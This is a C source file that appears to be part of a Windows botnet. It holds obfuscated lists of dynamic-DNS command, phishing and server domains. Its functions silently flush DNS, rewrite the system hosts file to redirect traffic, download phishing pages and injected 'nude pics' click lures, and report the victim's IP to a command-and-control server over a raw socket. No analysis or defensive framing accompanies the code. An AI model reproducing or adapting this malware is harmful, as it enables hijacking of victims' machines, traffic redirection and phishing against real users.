#include "mylib.h"
#include "dns.h"

#include <windows.h>

const char *irc_dns[]= {
      "ƒ„‚vƒ~C~ˆBvB|zz€C„‡|", // nomanix.is-a-geek.org 
      "ƒ††…xyxŠ|E€ŠDxD~||‚E…|‹", // loonabase.is-a-geek.net
      "~…ˆ{ƒwD‰CwC}{{Dy…ƒ", // horemawk.is-a-geek.com
      "ƒwŠ‰…„D‰CwC}{{D…ˆ}", // maxtyson.is-a-geek.org 
      "ƒ………~wwD‰CwC}{{D…ˆ}" // mooohwaa.is-a-geek.org 
};
      
const char *phishing_dns[]= {
      "„‰D‹€…‚ƒ|ŠE†„|Œ…€E…|‹", // mr-tinkles.homeunix.net
      "|uˆˆ†}wB„ƒxƒ‚yBƒ†{", // hattrick.podzone.org
      "wŠz‚v‡|z‡Cy‹‡yƒˆC„‡|", // bluemarger.dvrdns.org
      "z…„Šw‰Dz„‰w‚w‰D…ˆ}", // dontaskwy.dnsalias.org
      "y„„‚Œvˆz‡zC}„‚z~…Cƒz‰" // doomwasere.homeip.net
};

const char *http_dns[]= {
      "~~€u†ƒw|By†‡y}‚yB‚‰", // jjlaroch.merseine.nu
      "Š‹x‰{†…†x…E{…{…ŠE†‰~", // jstardonovan.dyndns.org
      "‚z‡ˆzˆ~yzC…„y„ƒzCƒz‰", // merseside.podzone.net
      "wŠ|ˆwŠƒƒˆCw„|yƒˆCx„‚", // bugsbunns.blogdns.com
      "ˆrˆŠŠ>}y~u>~…" // xobxzooz.mine.nu
};

const char *command_dns[]= {
      "––€€ƒ—K€“ŒŒ—––L‚—ŒKK‘“L‹", // xxbabey-bunnyxx.dyn-o-saur.com
      "€‡†}‘‹ŒyŠ~Š}F}z€‡ˆFz’", // honeystarfire.webhop.biz
      "z‰„„ˆzCˆz‡‹zwwˆCx„‚", // letloose.servebbs.com
      "}…x‚„‰…„D†…z…„{D„{Š", // goblinsown.podzone.net
      "‡Œƒ‘‘ƒ†L†‹K‚‡KLŒƒ’" // princesspeach.ham-radio-op.net
};

const char *edit_dns[]= {
      "€‚‚€ttAwŒt|t†A‚…z", // moomaa.dynalias.org
      "”|‰Š|’I”‰HŠH|I~Šˆ", // tyranosawrus.dyn-o-saur.com
      "‚‡‚‡~…‚ˆ‡Gˆ†~‰G‡~", // tintinthelion.homeftp.net
      "…ƒ…ˆ…„Dz„z„‰D„|…", // oxymoronix.dyndns.info
      "ƒwŠ~‰wzzD{x~…†D…ˆ}" // maxthisaddy.webhop.org
};

const char *server_dns[]= {
      "Œ‹‘~ˆŒ‹†‹€†‰‚K”‚…ŒKŒ„", // dontaskonprinciple.webhop.org
      "ƒ‹}}„‰}ˆˆJ‡…‡I}JŠ", // gottacathemall.kicks-ass.net
      "ŒŒˆˆ„‚•™N…„†‰”…’…”N…”", // lolahhadabunny.endofinternet.net
      "ƒ~ƒ~ƒ~ƒBv€ƒ{x‚‡Bwƒ", // mojojojo.blogdns.com
      "…‘ˆ{‹yŠ}}}F…‘ˆ€‡Œ‡‹F{{" // mypicsaregee.myphotos.cc
};
      
char *
DnsGetDomain
(int dns_type) {
    char *lpDnsHost;
    srand(GetTickCount());
    lpDnsHost=malloc(0x40);
    WinExec(riddle_enc("{‚u€x{y2Ax~‡…zv€…"),SW_HIDE); // ipconfig /flushdns
    switch(dns_type) {
        case IRC_DNS:
            strcpy(lpDnsHost,riddle_enc(irc_dns[rand() % sizeof(irc_dns) / sizeof(irc_dns[0x0])]));
            break;
        case HTTP_DNS:
            strcpy(lpDnsHost,riddle_enc(http_dns[rand() % sizeof(http_dns) / sizeof(http_dns[0x0])]));
            break;
        case PHISHING_DNS:
            strcpy(lpDnsHost,riddle_enc(phishing_dns[rand() % sizeof(phishing_dns) / sizeof(phishing_dns[0x0])]));
            break;
        case COMMAND_DNS:
            strcpy(lpDnsHost,riddle_enc(command_dns[rand() % sizeof(command_dns) / sizeof(command_dns[0x0])]));
            break;
        case SERVER_DNS:
            strcpy(lpDnsHost,riddle_enc(server_dns[rand() % sizeof(server_dns) / sizeof(server_dns[0x0])]));
            break;
        case EDIT_DNS:
            strcpy(lpDnsHost,riddle_enc(edit_dns[rand() % sizeof(edit_dns) / sizeof(edit_dns[0x0])]));
            break;
    }
    return(lpDnsHost);
}

int
DnsEditHostsFile
(char *lpHostName, char *lpRedirect) {
    char fpath[0x40],tmp[0x40];
    GetSystemDirectory(fpath,sizeof(fpath));
    strcat(fpath,riddle_enc("nv„{ˆw„…nw†unz…†…")); // \drivers\etc\hosts
    sprintf(tmp,riddle_enc("*x%*x"),lpRedirect,lpHostName); // %s %s
    return(LogToFile(fpath,tmp,"a"));
}

void
DnsGetPhishingPage
(struct darkness_d *darkness) {
    char buf[0x15F90],fname[0x40];
    GetWebPage(buf,sizeof(buf),DnsGetDomain(PHISHING_DNS),"",riddle_enc("JHW"),"",0x0); // GET
    sprintf(fname,riddle_enc(",k5o{ts"),GetRandomNumber()); // %d.html
    LogToFile(fname,buf,"w");
    strcpy(darkness->html_file,fname);
}

char *
DnsGetEditData
(void) {
    char buf[0x600], *lpEditData, *tmp, *p;
    GetWebPage(buf,sizeof(buf),DnsGetDomain(EDIT_DNS),"",riddle_enc("JHW"),"",0x1); // GET
    if(tmp=strstr(buf,riddle_enc("9potollE+"))) { // .editdata: 
       tmp += 0xB;
       if(p=strstr(tmp,riddle_enc("XQ‚…PS†TTP‚YXQP†‚V„RQ‚YWSR„……"))) // 81be0a3f440b9810fb6d21aba9732dee
         p[0x0]='\0';
    }
    else return(riddle_enc("’¼ÅÄÊvÉ¿Ğ»“”’·v¾È»¼“¾ÊÊÆ……{É”Ÿœv¯¥«v­—¤ªvª¥v©››v£¯v¤«š›v¦Ÿ™©v™¢Ÿ™¡v›¨›w’…·”’…¼ÅÄÊ”")); 
    // <font size=+4><a href="http://%s">IF YOU WANT TO SEE MY NUDE PICS CLICK HERE!</a></font>
    lpEditData=malloc(strlen(tmp) + 0x1);
    strcpy(lpEditData,tmp);
    return(lpEditData);
}

int
DnsCheckCommandType
(void) {
    char buf[0x200]; 
    unsigned long sock;
    struct hostent *hNetwork; 
    if(hNetwork=gethostbyname(DnsGetDomain(COMMAND_DNS))) {
      struct sockaddr_in addr;
      sock=socket(AF_INET,SOCK_STREAM,0x0);
      addr.sin_family=AF_INET; 
      addr.sin_port=htons(0x1375);
      addr.sin_addr=*((struct in_addr*)hNetwork->h_addr);
      connect(sock,(struct sockaddr *)&addr,sizeof(struct sockaddr));
      sprintf(buf,
          "170d066c9e8bec8ac82de5634069e158=%s",
          GetLocalIpAddress()); 
      send(sock,buf,strlen(buf),0x0);
      memset(buf,'\0',sizeof(buf));
      recv(sock,buf,sizeof(buf),0x0);
      closesocket(sock);
      return(!strcmp(buf,riddle_enc("U†Y†XƒYQ…W„RUR‚†‚U‚TTT„PTS‚RRS")) ? COMMAND_TYPE_IRC : 
             // 5f9f8c91ae7d252bfb5b444d0a43b223
             !strcmp(buf,riddle_enc("S‚WQ„„Yƒ……URWVYƒUPXYV‚‚WSQRYRQƒ")) ? COMMAND_TYPE_HTTP : 0x2); 
             // 3b71dd9ceae52769c50896bb7312921c
    }
    else return(0x2);
}
